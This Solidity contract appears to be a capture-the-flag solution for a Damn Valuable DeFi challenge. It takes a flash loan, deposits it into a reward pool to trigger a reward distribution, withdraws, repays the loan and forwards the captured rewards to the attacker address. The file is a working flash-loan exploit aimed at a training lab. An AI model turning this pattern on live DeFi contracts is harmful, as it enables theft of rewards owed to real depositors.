// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {RewardToken} from "./RewardToken.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

interface IFlashLoanReceiver {
    function receiveFlashLoan(uint256 amount) external;

    error SenderIsNotFlashLoanerPool();

    error SenderIsNotOwner();
}

contract FlashLoanReceiver {
    using Address for address;

    address private _attacker;
    address private _flashLoanerPool;
    address private _rewarderPool;
    DamnValuableToken private _dvt;
    RewardToken private _rewardToken;

    error SenderIsNotFlashLoanerPool();
    error SenderIsNotOwner();
    error TransferFail();
    error CallFailed();

    constructor(
        address flashLoanerPool,
        address rewarderPool,
        address dvtAddress,
        address rewardTokenAddress
    ) {
        _attacker = msg.sender;
        _flashLoanerPool = flashLoanerPool;
        _rewarderPool = rewarderPool;
        _dvt = DamnValuableToken(dvtAddress);
        _rewardToken = RewardToken(rewardTokenAddress);
    }

    function attack(uint256 amount) external {
        if (msg.sender != _attacker) revert SenderIsNotOwner();
        _flashLoanerPool.functionCall(
            abi.encodeWithSignature("flashLoan(uint256)", amount)
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        if (msg.sender != _flashLoanerPool) revert SenderIsNotFlashLoanerPool();
        if (!_dvt.approve(_rewarderPool, amount)) revert CallFailed();

        _rewarderPool.functionCall(
            abi.encodeWithSignature("deposit(uint256)", amount)
        );

        if (_dvt.balanceOf(address(this)) > 0) revert("deposit failed");

        _rewarderPool.functionCall(
            abi.encodeWithSignature("distributeRewards()")
        );
        _rewarderPool.functionCall(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );

        if (!_dvt.transfer(_flashLoanerPool, amount)) revert TransferFail();

        uint256 rewards = RewardToken(_rewardToken).balanceOf(address(this));

        if (!_rewardToken.transfer(_attacker, rewards)) revert TransferFail();
    }
}
